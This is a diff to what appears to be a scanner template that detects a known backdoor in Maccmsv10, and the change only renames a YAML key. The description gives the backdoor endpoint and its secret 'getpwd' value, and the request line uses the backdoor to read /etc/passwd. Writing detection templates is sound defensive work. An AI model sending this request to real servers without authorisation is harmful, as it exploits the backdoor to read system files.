@@ -6,7 +6,7 @@ info:
   description: A backdoor has been found in Maccmsv10, the backdoor is accessible via the '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'WorldFilledWithLove'.
   tags: maccmsv10,rce
 
-requests:
+http:
   - method: POST
     path:
       - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
